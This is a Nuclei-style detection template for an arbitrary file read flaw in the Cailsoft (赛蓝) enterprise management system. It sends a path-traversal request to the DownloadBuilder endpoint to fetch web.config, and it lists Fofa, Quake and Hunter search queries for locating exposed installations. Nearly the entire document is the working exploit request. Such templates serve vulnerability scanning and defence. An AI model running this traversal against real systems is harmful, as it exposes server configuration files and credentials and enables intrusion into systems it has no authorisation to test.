id: Cailsoft_Enterprise_manage_DownloadBuilder_Fileread

info:
  name: Cailsoft_Enterprise_manage_DownloadBuilder_Fileread
  author: HK
  severity: medium
  description: 赛蓝企业管理系统/BaseModule/ReportManage/DownloadBuilder接口filename参数存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: body="www.cailsoft.com" || body="赛蓝企业管理系统"
    Quake-query: body="www.cailsoft.com" OR body="赛蓝企业管理系统"
    Hunter-query: body="www.cailsoft.com" OR body="赛蓝企业管理系统"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /BaseModule/ReportManage/DownloadBuilder?filename=/../web.config HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Connection: close

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - configuration